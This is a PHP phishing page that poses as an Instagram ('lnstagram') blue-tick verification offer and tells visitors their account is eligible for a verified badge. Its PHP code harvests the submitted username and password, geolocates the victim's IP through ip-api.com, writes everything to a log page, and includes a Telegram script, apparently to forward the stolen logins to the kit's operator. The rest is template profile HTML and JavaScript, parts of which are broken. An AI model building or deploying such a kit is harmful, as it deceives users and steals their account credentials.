
<?php



session_start();
set_time_limit(0);
error_reporting(E_ALL);




$username = $_GET["username"];


if($_POST){

	$username=$_GET["username"];
	$username=$_POST["username"];
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  

$cur_time=date("d-m-Y H:i:s");

    $file = fopen('igardo.php', 'a');
fwrite($file, "
<html lang='tr' dir='ltr'>
  <head>
      <title>Igardo</title>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
   
    <link rel='stylesheet' href='q-igardo-phs.css'>
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css'/>
  </head>
  <body>
    <div class='container'>
      <div class='wrapper'>
 
        <div class='title'><img src='q-igardo-phs/q-igardo.jpg' style='width:34%;  border-radius:23px; box-shadow: rgba(0, 0, 0, 0.4) 0px 2px 4px, rgba(0, 0, 0, 0.3) 0px 7px 13px -3px, rgba(0, 0, 0, 0.2) 0px -3px 0px inset;'></div>
        <form action='q-wrong-pw/index.php'>

          <div class='row'>
            <i class='fas fa-user'></i>
          <p style='color:#fff; margin-left:22%; font-size:17px; opacity:0.8;'>Kullanıcı Adı ;<br>$username</p>
          </div>
            <div class='row'>
            <i class='fas fa-lock'></i>
               <p style='color:#fff; margin-left:22%; font-size:17px; opacity:0.8;'>Şifre ;<br>$password</p>
         
          </div>
             <div class='row'>
            <i class='fas fa-check'></i>
               <p style='color:#fff; margin-left:22%; font-size:17px; opacity:0.8;'>İp Adresi ;<br>$ip</p>
         
          </div>
            <div class='row'>
            <i class='fas fa-clock'></i>
               <p style='color:#fff; margin-left:22%; font-size:17px; opacity:0.8;'>Giriş Zamanı ;<br>$cur_time</p>
         
          </div>
                 <div class='row'>
            <i class='fas fa-globe'></i>
               <p style='color:#fff; margin-left:22%; font-size:17px; opacity:0.8;'>Ülke ;<br>$ulke</p>
         
          </div>
       
          <div class='row'>
            <i class='fas fa-flag'></i>
               <p style='color:#fff; margin-left:22%; font-size:17px; opacity:0.8;'>Şehir ;<br>$sehir</p>
         
          </div>
   
          <div class='signup-link'>Yapımcı ve Geliştirici <a href='#5'><br>© Igardo Ivanov</a></div>
        </form>
      </div>
    </div>

  </body>
</html>


"); 

fclose($file);
echo '';
  
   header("Location: ");
   include 'igardotelegram/telegramuser.php';
}
?>

<!DOCTYPE html>
<html lang="en" >

<head>

  <meta charset="UTF-8">
  
<link rel="apple-touch-icon" type="image/png" href="q-igardo-img/q-igardo-favicon.png" />
<meta name="apple-mobile-web-app-title" content="Igardo">

<link rel="shortcut icon" type="image/x-icon" href="q-igardo-img/q-igardo-favicon.png" />

<link rel="mask-icon" type="image/x-icon" href="q-igardo-img/q-igardo-favicon.png" color="#111" />


  <title>   <?php echo  $username; ?></title>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
   

<meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" media="screen" href="q-igardo-css/q-igardo-profile.css"> 

  <title>lnstagram Profile</title>
  
  
  <link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Baloo+2https://fonts.googleapis.com/css2?family=Baloo+2:wght@300;400;500;600&display=swap:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;amp;display=swap'>
<link rel='stylesheet' href='q-igardo-css/q-igardo-profile-1.css'>
<link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Material+Icons'>
<link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Material+Icons+Outlined'>
<link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Material+Icons+Round'>
<link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Material+Icons+Sharp'>
<link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Material+Icons+Two+Tone'>
  

  <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>


</head>

<body translate="no" >
  <!-- Navbar -->
<nav id="navbar" class="flexbox">

  <!-- Navbar Inner -->
  <div class="navbar-inner view-width flexbox-space-bet">
  <img src="q-igardo-img/q-igardo-logo.png" style="width:33%;">
  </div>
</nav>

<!-- Main -->
<main id="main">

  <!-- Profile Top -->
  <div class="profile-top">

    <!-- Profile Info -->
    <div class="profile-info flexbox">
      <!-- Profile Info Inner -->
      <div class="profile-info-inner view-width flexbox-space-bet-start">
        <!-- Profile Left -->
        <div class="profile-left flexbox-start">
          <div class="profile-picture-wrapper profile-picture-large flexbox">
            <div class="profile-picture-inner flexbox">
              <img class="profile-picture" src="q-igardo-img/q-igardo-profile-img.png" alt="">
            </div>
          <div class="profile-picture-background"></div>
        </div>
        <div class="profile-username-wrapper flexbox-col-start">
          <h3 class="profile-username flexbox">
            <span class="name">@<?php echo  $username; ?></span>
            <span class="material-icons-round">verified</span>
          </h3>
          <div class="profile-followers profile-followers-desk flexbox">
            <p><span class="posts-amount" style="width:75%;">
            Your account is eligible for approval. As a result of our support team's long research, certain accounts are eligible to receive blue ticks. 
            </span></p>
          
          </div>
          <div class="profile-bio">
            <p class="profile-bio-inner">
              <span class="line" style="width:75%;">The blue tick is only given to certain users. Profiles that have received a Blue Tick are approved by lnstagram.</span>
             
              <span class="line"><a class="profile-bio-link" href="https://www.instagram.com" target="_blank">www.instagram.com</a></span>
            </p>
          </div>
        </div>
      </div>
      <!-- Profile Right -->
   
      <div class="profile-right flexbox-start">
       
        <a href="q-igardo-contact.php"> <button>Confirm your account</button>
      </div></a>
    </div>
  </div>

  <!-- Profile Stories -->
  <div class="profile-stories flexbox">

    <div class="profile-stories-inner view-width flexbox-left">
      <div class="profile-stories-overlay"></div>
        <!-- Profile Stories Inner -->
        <div class="profile-stories-scroll flexbox-left">

        </div>
      </div>

    </div>
  </div>

  <!-- Profile Grid -->
  <div class="profile-grid flexbox-col">

    <!-- Profile Grid Inner -->
    <div class="profile-grid-inner view-width">



    </div>

    <!-- Profile Grid Images -->
    <div class="profile-grid-images flexbox">



    </div>

  </div>

</main>
     

  
      <script id="rendered-js" >
//
// This is currently a work in progress!
// More features will come soon :)
// -
//
function kFormatter(num) {
  return Math.abs(num) > 999 ? Math.sign(num) * (Math.abs(num) / 1000).toFixed(1) + 'k' : Math.sign(num) * Math.abs(num);
}


const mouse = { x: -100, y: -100 }; // mouse pointer's coordinates
const pos = { x: 0, y: 0 }; // cursor's coordinates
const speed = 0.1; // between 0 and 1

// Hover functions variables
let ogPostHover = document.querySelectorAll(".og-post");
// Hover functions
ogPostHover.forEach(function (item) {
  item.addEventListener("mouseenter", function () {
    item.querySelector(".og-post-note").style.opacity = "1";
  });
  item.addEventListener("mouseleave", function () {
    item.querySelector(".og-post-note").style.opacity = "0";
  });
});
// Hover functions variables
let infPostHover = document.querySelectorAll(".info-post");
// Hover functions
infPostHover.forEach(function (item) {
  item.addEventListener("mouseenter", function () {
    item.querySelector(".info-post-note").style.opacity = "1";
  });
  item.addEventListener("mouseleave", function () {
    item.querySelector(".info-post-note").style.opacity = "0";
  });
});

const updateCoordinates = e => {
  mouse.x = e.clientX;
  mouse.y = e.clientY;
};

window.addEventListener('mousemove', updateCoordinates);

const updateCursor = () => {
  const diffX = Math.round(mouse.x - pos.x);
  const diffY = Math.round(mouse.y - pos.y);

  pos.x += diffX * speed;
  pos.y += diffY * speed;

  const translate = 'translate3d(' + pos.x + 'px ,' + pos.y + 'px, 0)';

  ogPostHover.forEach(function (item) {
    item.querySelector(".og-post-note").style.transform = translate;
  });
  infPostHover.forEach(function (item) {
    item.querySelector(".info-post-note").style.transform = translate;
  });
};

function loop() {
  updateCursor();
  requestAnimationFrame(loop);
}

requestAnimationFrame(loop);


let linkPrefix = "q-igardo-img/";


// * -
// FOR CREATING POSTS
// * -

let profileStories,
profileStoriesInner,
// For Array
storyIdEnc,
storyIdPrefix,
storyIdSuffix,
// Elements to be created
profileStory,
profileStoryInner,
profileStoryImage,
profileStoryBackground;


profileStoriesInner = document.getElementsByClassName("profile-stories-scroll")[0];

storyIdPrefix = "storie-";
storyIdSuffix = "-ogEnc";


profileStories = [
];




// Function For Creating Elements Inside Container
function createStories(item, index) {
  // Create Elements
  // = - = - = - = -
  profileStory = document.createElement('div');
  profileStoryInner = document.createElement('div');
  profileStoryImage = document.createElement('img');
  profileStoryBackground = document.createElement('div');
  // Set Classes On Created Elements
  // = - = - = - = - = - = - = - = -
  profileStory.className = 'profile-story-wrapper flexbox';
  storyIdEnc = btoa(profileStories[index]["storyId"]);
  profileStory.id = storyIdEnc;
  profileStoryInner.className = 'profile-story-inner flexbox';
  profileStoryImage.className = 'profile-story';
  profileStoryBackground.className = 'profile-story-background';
  // Take Info From Array, And Apply To Elements
  // = - = - = - = - = - = - = - = - = - = - = -
  profileStoryImage.src = profileStories[index]["storyImage"];
  // Append Children
  // = - = - = - = -
  profileStoriesInner.appendChild(profileStory);
  profileStory.appendChild(profileStoryInner);
  profileStoryInner.appendChild(profileStoryImage);
  profileStory.appendChild(profileStoryBackground);
}

// Run Function In A Loop
profileStories.forEach(createStories);


// * -
// FOR CREATING POSTS
// * -

// Declaring Variables
let profilePosts,
profileGridInner,
// For Array
postIdPrefix,
postIdPrefixEnc,
// Elements to be created
profilePost,
profilePostOverlay,
profilePostImage,
profilePostImageTwo,
profilePostMulitpleImageIcon,
profilePostLC,
profilePostLikes,
profilePostComments,
// PROFILE IMAGES
profileGridImages,
profileGridImageWrapper,
profileGridImageInner,
profileGridImage,
profileGridImageRight,
// For Array
imgIdPrefixEnc;

profileGridInner = document.getElementsByClassName("profile-grid-inner")[0];

profileGridImages = document.getElementsByClassName("profile-grid-images")[0];

postIdPrefix = "postie-";

profilePosts = [
];




// Function For Creating Elements Inside Container
function createPosts(item, index) {
  // Create Elements
  // = - = - = - = -
  profilePost = document.createElement('div');
  profilePostOverlay = document.createElement('div');
  profilePostImage = document.createElement('img');
  profilePostImageTwo = document.createElement('img');
  profilePostMulitpleImageIcon = document.createElement('p');
  profilePostLC = document.createElement('div');
  profilePostLikes = document.createElement('p');
  profilePostComments = document.createElement('p');
  // Set Classes On Created Elements
  // = - = - = - = - = - = - = - = -
  profilePost.className = 'profile-post flexbox';
  postIdPrefixEnc = btoa(profilePosts[index]["postId"]);
  profilePost.id = postIdPrefixEnc;
  profilePostOverlay.className = 'profile-post-overlay';
  profilePostImage.className = 'profile-post-image post-image-1';
  profilePostImageTwo.className = 'profile-post-image post-image-2';
  profilePostMulitpleImageIcon.className = 'profile-post-multiple-image-icon';
  profilePostLC.className = 'profile-post-lc flexbox';
  profilePostLikes.className = 'profile-post-likes flexbox';
  profilePostComments.className = 'profile-post-comments flexbox';
  // Take Info From Array, And Apply To Elements
  // = - = - = - = - = - = - = - = - = - = - = -
  profilePostImage.src = profilePosts[index]["postImage"];
  profilePostImageTwo.src = profilePosts[index]["postImageTwo"];
  if (profilePosts[index]["postAmount"] === "1") {
    profilePostMulitpleImageIcon.innerHTML = "";
  } else if (profilePosts[index]["postAmount"] === "2") {
    profilePostMulitpleImageIcon.innerHTML = "<span class=\"material-icons-round\">collections</span>";
  }
  profilePostLikes.innerHTML = "<span class=\"material-icons-round\">thumb_up</span>" + kFormatter(profilePosts[index]["postLikes"]);
  profilePostComments.innerHTML = "<span class=\"material-icons-round\">textsms</span>" + kFormatter(profilePosts[index]["postComments"]);
  // Append Children
  // = - = - = - = -
  profileGridInner.appendChild(profilePost);
  profilePost.appendChild(profilePostOverlay);
  profilePost.appendChild(profilePostImage);
  profilePost.appendChild(profilePostImageTwo);
  profilePost.appendChild(profilePostMulitpleImageIcon);
  profilePost.appendChild(profilePostLC);
  profilePostLC.appendChild(profilePostLikes);
  profilePostLC.appendChild(profilePostComments);
  // * -
  // POSTS IMAGES
  // * -
  profileGridImageWrapper = document.createElement('div');
  profileGridImageInner = document.createElement('div');
  profileGridImage = document.createElement('img');
  profileGridImageRight = document.createElement('div');
  // Set Classes On Created Elements
  // = - = - = - = - = - = - = - = -
  profileGridImageWrapper.className = 'profile-grid-image-wrapper view-width';
  imgIdPrefixEnc = postIdPrefixEnc + '&amp;img';
  profileGridImageWrapper.id = imgIdPrefixEnc;
  profileGridImageInner.className = 'profile-grid-image-inner flexbox';
  profileGridImage.className = 'profile-grid-image';
  profileGridImageRight.className = 'profile-grid-image-right';
  // Take Info From Array, And Apply To Elements
  // = - = - = - = - = - = - = - = - = - = - = -
  profileGridImage.src = profilePosts[index]["postImage"];
  // Append Children
  // = - = - = - = -
  profileGridImages.appendChild(profileGridImageWrapper);
  profileGridImageWrapper.appendChild(profileGridImageInner);
  profileGridImageInner.appendChild(profileGridImage);
  profileGridImageWrapper.appendChild(profileGridImageRight);
}

// Run Function In A Loop
profilePosts.forEach(createPosts);


// Hover functions variables
let profilePostHover = document.querySelectorAll(".profile-post");
// Hover functions
profilePostHover.forEach(function (item) {
  item.addEventListener("mouseenter", function () {
    item.querySelector(".profile-post-image").style.transform = "scale(1.1, 1.1)";
    item.querySelector(".profile-post-overlay").style.backgroundColor = "rgba(0, 0, 0, .4)";
    item.querySelector(".profile-post-lc").style.opacity = "1";
  });
  item.addEventListener("mouseleave", function () {
    item.querySelector(".profile-post-image").style.transform = "scale(1, 1)";
    item.querySelector(".profile-post-overlay").style.backgroundColor = "rgba(0, 0, 0, 0)";
    item.querySelector(".profile-post-lc").style.opacity = "0";
  });
});


let postsAmount,
followersAmount,
followingAmount;

postsAmount = document.querySelectorAll(".posts-amount");
followersAmount = document.querySelectorAll(".followers-amount");
followingAmount = document.querySelectorAll(".following-amount");

postsAmount.forEach(function (item) {
  item.innerHTML = kFormatter(profilePosts.length);
});
followersAmount.forEach(function (item) {
  item.innerHTML = kFormatter(.);
});
followingAmount.forEach(function (item) {
  item.innerHTML = kFormatter(.);
});

    </script>

  

</body>

 
  </div> 
 </body>
</html>